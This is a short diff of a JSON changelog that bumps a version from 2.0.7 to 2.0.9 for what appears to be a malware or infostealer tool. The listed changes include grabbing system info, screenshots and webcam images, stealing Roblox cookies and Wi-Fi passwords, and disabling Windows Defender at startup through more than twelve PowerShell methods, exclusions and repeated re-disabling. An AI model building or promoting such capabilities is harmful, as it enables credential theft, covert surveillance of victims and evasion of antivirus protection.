@@ -1,6 +1,6 @@
 {
-  "version": "2.0.7",
-  "title": "What's New in 2.0.7",
+  "version": "2.0.9",
+  "title": "What's New in 2.0.9",
   "changes": [
     "5 new features: System Info, Screenshot, Webcam, Roblox Cookies, Wi-Fi Passwords",
     "Windows Defender fully disabled on startup (12+ PowerShell methods + exclusions + 3-min re-enable)",
